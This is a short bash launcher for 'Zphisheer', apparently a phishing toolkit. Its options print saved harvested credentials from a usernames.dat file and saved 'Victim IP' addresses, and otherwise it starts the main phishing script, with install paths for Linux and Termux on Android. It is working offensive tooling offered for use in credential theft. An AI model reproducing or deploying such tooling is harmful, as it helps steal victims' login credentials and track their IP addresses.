#!/bin/bash

# https://github.com/ArmandoRN/zphisheer

if [[ $(uname -o) == *'Android'* ]];then
	ZPHISHEER_ROOT="/data/data/com.termux/files/usr/opt/zphisheer"
else
	export ZPHISHEER_ROOT="/opt/zphisheer"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Zphisheer type \`zphisheer\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZPHISHEER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZPHISHEER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ZPHISHEER_ROOT
	bash ./zphisheer.sh
fi
